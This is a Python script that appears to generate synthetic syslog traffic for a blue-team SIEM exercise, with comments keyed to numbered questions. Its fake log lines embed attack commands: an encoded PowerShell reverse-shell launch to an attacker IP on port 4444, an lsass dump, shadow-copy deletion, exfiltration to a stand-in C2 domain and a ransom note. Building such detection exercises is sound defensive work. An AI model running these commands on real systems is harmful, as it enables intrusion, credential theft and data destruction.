import socket
import time
import random
import datetime

# Target LOG360 Syslog Server
LOG360_IP = "127.0.0.1"
LOG360_PORT = 514

# Domain Config
DOMAIN = "MEGACORP"
ATTACKER_IP = "10.14.22.99"

# Generate 50 Devices
DEVICES = [{"hostname": "DC-MEGACORP-01", "ip": "192.168.1.10"}]
for i in range(1, 40):
    DEVICES.append({"hostname": f"WKSTN-FIN{i:02d}", "ip": f"192.168.1.{100+i}"})
for i in range(1, 6):
    DEVICES.append({"hostname": f"WEB-DMZ{i:02d}", "ip": f"10.0.0.{50+i}"})
for i in range(1, 5):
    DEVICES.append({"hostname": f"DB-PROD{i:02d}", "ip": f"10.0.1.{20+i}"})

USERS = ["j.smith", "a.davis", "m.johnson", "administrator", "svc_web"]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def send_syslog(hostname, message, severity=6, facility=1):
    pri = (facility * 8) + severity
    now_str = datetime.datetime.now().strftime("%b %d %H:%M:%S")
    syslog_msg = f"<{pri}>{now_str} {hostname} {message}"
    sock.sendto(syslog_msg.encode('utf-8'), (LOG360_IP, LOG360_PORT))

def now():
    return datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")

def generate_noise():
    device = random.choice(DEVICES)
    user = random.choice(USERS)
    
    # Random successful logon (Event ID 4624)
    msg_4624 = f"MSWinEventLog\t1\tSecurity\t{random.randint(1000,9999)}\t{now()}\t4624\tMicrosoft-Windows-Security-Auditing\t{user}\tN/A\tSuccess Audit\t{device['hostname']}\tLogon\tAn account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: {device['hostname']}$ Account Domain: {DOMAIN} Logon Type: 3 New Logon: Security ID: S-1-5-21-12345 Account Name: {user} Account Domain: {DOMAIN} Logon ID: 0x3E7 Source Network Address: {random.choice(['192.168.1.55', '10.0.0.12'])}"
    send_syslog(device["hostname"], msg_4624)

    # Random Firewall drop
    firewall_msg = f"Firewall: %ASA-4-106023: Deny tcp src outside:{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}/443 dst inside:{device['ip']}/{random.randint(1024,65535)} by access-group \"outside_access_in\""
    send_syslog("FW-CORE-01", firewall_msg, severity=4, facility=4)

def inject_attack():
    print(f"[*] INJECTING APT ATTACK SEQUENCE AT {now()}...")

    # Q3: Firewall dropped traffic from 10.14.22.99
    for _ in range(10):
        fw_msg = f"Firewall: %ASA-4-106023: Deny tcp src outside:{ATTACKER_IP}/443 dst inside:10.0.0.51/443 by access-group \"outside_access_in\""
        send_syslog("FW-CORE-01", fw_msg, severity=4)
        
    # Q4 & Q5: Web Scanner (Nuclei) and CVE-2023-46805
    web_msg = f"WEB-DMZ01 IIS-Log: 10.0.0.51 GET /api/v1/status - 443 - {ATTACKER_IP} Nuclei/v2.9.1 - 200 0 0 15"
    send_syslog("WEB-DMZ01", web_msg)
    ids_msg = f"IDS-SENSOR: [1:1000123:1] EXPLOIT CVE-2023-46805 Attempt [Classification: Web Application Attack] [Priority: 1] {{TCP}} {ATTACKER_IP}:54321 -> 10.0.0.51:443"
    send_syslog("IDS-CORE", ids_msg, severity=1)

    # Q6: Web shell upload URI
    shell_msg = f"WEB-DMZ01 IIS-Log: 10.0.0.51 POST /admin/shell_v2.aspx - 443 - {ATTACKER_IP} Mozilla/5.0 - 200 0 0 100"
    send_syslog("WEB-DMZ01", shell_msg)

    # Q7 & Q8: Password Spray & Compromise (j.smith)
    for u in USERS:
        spray_msg = f"MSWinEventLog\t1\tSecurity\t1\t{now()}\t4625\tMicrosoft-Windows-Security-Auditing\t{u}\tN/A\tFailure Audit\tDC-MEGACORP-01\tLogon\tAn account failed to log on. Account Name: {u} Source Network Address: {ATTACKER_IP} Sub Status: 0xc000006a"
        send_syslog("DC-MEGACORP-01", spray_msg)
    
    # Q9: Successful Logon (Logon Type 3)
    succ_msg = f"MSWinEventLog\t1\tSecurity\t2\t{now()}\t4624\tMicrosoft-Windows-Security-Auditing\tj.smith\tN/A\tSuccess Audit\tDC-MEGACORP-01\tLogon\tAn account was successfully logged on. Account Name: j.smith Logon Type: 3 Source Network Address: {ATTACKER_IP}"
    send_syslog("DC-MEGACORP-01", succ_msg)

    # Q10 & Q11: PowerShell reverse shell (w3wp.exe -> powershell.exe to port 4444)
    proc_msg = f"MSWinEventLog\t1\tSysmon\t1\t{now()}\t1\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tWEB-DMZ01\tProcess creation\tProcess Create: ParentImage: C:\\windows\\system32\\inetsrv\\w3wp.exe Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA0AC4AMgAyAC4AOQA5ACIALAAgADQANAA0ADQAKQA="
    send_syslog("WEB-DMZ01", proc_msg)
    net_msg = f"MSWinEventLog\t1\tSysmon\t3\t{now()}\t3\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tWEB-DMZ01\tNetwork connection\tNetwork connection detected: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe DestinationIp: {ATTACKER_IP} DestinationPort: 4444"
    send_syslog("WEB-DMZ01", net_msg)

    # Q12 & Q13: Persistence Service (WinRM_SVC_Mgmt via C:\Windows\Temp\payload.exe)
    svc_msg = f"MSWinEventLog\t1\tSystem\t4\t{now()}\t7045\tService Control Manager\tN/A\tN/A\tInformation\tWEB-DMZ01\tService Installation\tA service was installed in the system. Service Name: WinRM_SVC_Mgmt Service File Name: C:\\Windows\\Temp\\payload.exe Service Type: user mode service Service Start Type: demand start"
    send_syslog("WEB-DMZ01", svc_msg)

    # Q14: Scheduled Task (Microsoft_Updates_Mgmt)
    sch_msg = f"MSWinEventLog\t1\tSecurity\t5\t{now()}\t4698\tMicrosoft-Windows-Security-Auditing\tN/A\tN/A\tSuccess Audit\tWEB-DMZ01\tOther Object Access Events\tA scheduled task was created. Task Name: \\Microsoft_Updates_Mgmt"
    send_syslog("WEB-DMZ01", sch_msg)

    # Q15 & Q16: Lateral Movement to DB-PROD01 (SMB C$, PSEXESVC.exe)
    smb_msg = f"MSWinEventLog\t1\tSecurity\t6\t{now()}\t5140\tMicrosoft-Windows-Security-Auditing\tN/A\tN/A\tSuccess Audit\tDB-PROD01\tFile Share\tA network share object was accessed. Share Name: \\\\*\\C$ Account Name: j.smith Source Address: 10.0.0.51"
    send_syslog("DB-PROD01", smb_msg)
    psexec_msg = f"MSWinEventLog\t1\tSysmon\t1\t{now()}\t1\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tProcess creation\tProcess Create: ParentImage: C:\\Windows\\System32\\services.exe Image: C:\\Windows\\PSEXESVC.exe CommandLine: PSEXESVC.exe"
    send_syslog("DB-PROD01", psexec_msg)

    # Q17: LSASS Dump (procdump.exe)
    lsass_msg = f"MSWinEventLog\t1\tSysmon\t10\t{now()}\t10\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tProcess Access\tProcess accessed: SourceImage: C:\\Windows\\Temp\\procdump.exe TargetImage: C:\\Windows\\system32\\lsass.exe CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll"
    send_syslog("DB-PROD01", lsass_msg)

    # Q18: DCSync (j.smith)
    dcsync_msg = f"MSWinEventLog\t1\tSecurity\t7\t{now()}\t4662\tMicrosoft-Windows-Security-Auditing\tN/A\tN/A\tSuccess Audit\tDC-MEGACORP-01\tDirectory Service Access\tAn operation was performed on an object. Object Name: DC=MEGACORP,DC=LOCAL Properties: Replicating Directory Changes All Account Name: j.smith"
    send_syslog("DC-MEGACORP-01", dcsync_msg)

    # Q19: Exfil Archive (backup_2026.zip)
    zip_msg = f"MSWinEventLog\t1\tSysmon\t11\t{now()}\t11\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tFileCreate\tFile created: TargetFilename: C:\\Users\\Public\\backup_2026.zip Image: C:\\Program Files\\7-Zip\\7z.exe"
    send_syslog("DB-PROD01", zip_msg)

    # Q20 & Q21: Exfiltration to c2.evil-empire.com via HTTPS
    exfil_msg = f"Firewall: %ASA-6-302013: Built outbound TCP connection 12345 for outside:c2.evil-empire.com/443 (10.14.22.99) to inside:10.0.1.21/54321"
    send_syslog("FW-CORE-01", exfil_msg, severity=6)

    # Q22: Log clearing (Event ID 1102)
    clear_msg = f"MSWinEventLog\t1\tSecurity\t8\t{now()}\t1102\tMicrosoft-Windows-Eventlog\tN/A\tN/A\tSuccess Audit\tDB-PROD01\tAudit Log Cleared\tThe audit log was cleared. Account Name: j.smith"
    send_syslog("DB-PROD01", clear_msg)

    # Q23 & Q24: Ransomware (vssadmin.exe Delete Shadows /All /Quiet and .RYUK)
    vss_msg = f"MSWinEventLog\t1\tSysmon\t1\t{now()}\t1\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tProcess creation\tProcess Create: ParentImage: C:\\Windows\\Temp\\payload.exe Image: C:\\Windows\\System32\\vssadmin.exe CommandLine: vssadmin.exe Delete Shadows /All /Quiet"
    send_syslog("DB-PROD01", vss_msg)
    ryuk_msg = f"MSWinEventLog\t1\tSysmon\t11\t{now()}\t11\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tFileCreate\tFile created: TargetFilename: C:\\Data\\Financials.xlsx.RYUK Image: C:\\Windows\\Temp\\payload.exe"
    send_syslog("DB-PROD01", ryuk_msg)

    # Q25: Ransomware note
    note_msg = f"MSWinEventLog\t1\tSysmon\t11\t{now()}\t11\tMicrosoft-Windows-Sysmon\tN/A\tN/A\tInformation\tDB-PROD01\tFileCreate\tFile created: TargetFilename: C:\\readme.txt Image: C:\\Windows\\Temp\\payload.exe FileContents: Send 50 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
    send_syslog("DB-PROD01", note_msg)

    print(f"[*] ATTACK INJECTION COMPLETE.")

if __name__ == "__main__":
    print(f"[*] Starting ManageEngine LOG360 V2 Live Traffic Generator...")
    print(f"[*] Sending Syslog traffic to {LOG360_IP}:{LOG360_PORT}")
    
    inject_timer = 0
    while True:
        generate_noise()
        time.sleep(0.5)  # 2 logs per second of noise
        inject_timer += 1
        
        # Inject the attack every 60 seconds
        if inject_timer >= 120:
            inject_attack()
            inject_timer = 0
